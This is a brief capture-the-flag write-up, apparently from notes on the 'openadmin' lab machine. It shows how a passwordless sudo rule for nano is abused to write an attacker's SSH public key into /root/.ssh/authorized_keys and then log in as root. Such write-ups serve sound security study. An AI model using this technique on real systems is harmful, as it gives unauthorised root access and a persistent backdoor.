# Privilege Escalation to root
User joanna can run following commands as sudo.
```bash
$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
When executed `sudo /bin/nano /opt/priv` , nano editor is opened which can read and execute commands as root. So running nano as sudo kali(my machine) public key can be copied to /root/.ssh/authorized keys and then can be ssh logged in as root. Procedure is shown below.
Nano is opened after executing `sudo /bin/nano /opt/priv`.
![[Pasted image 20210707064026.png]]
While being in nano, `Ctrl+r`  can be used to read files and `Ctrl+r then Ctrl+x` can be used to execute commands. So kali machine(my machine)'s public key can be copied to victim's machine(openadmin machine) by using `echo "[public-key]" > /root/.ssh/authorized_keys` command
![[Pasted image 20210707064647.png]]
Verified that public key copied in `/root/.ssh/authorized_keys` after reading `/root/.ssh/authorized_keys` while in nano.
![[Pasted image 20210707065009.png]]
Now ssh logged in as root on openadmin machine.
![[Pasted image 20210707065313.png]]


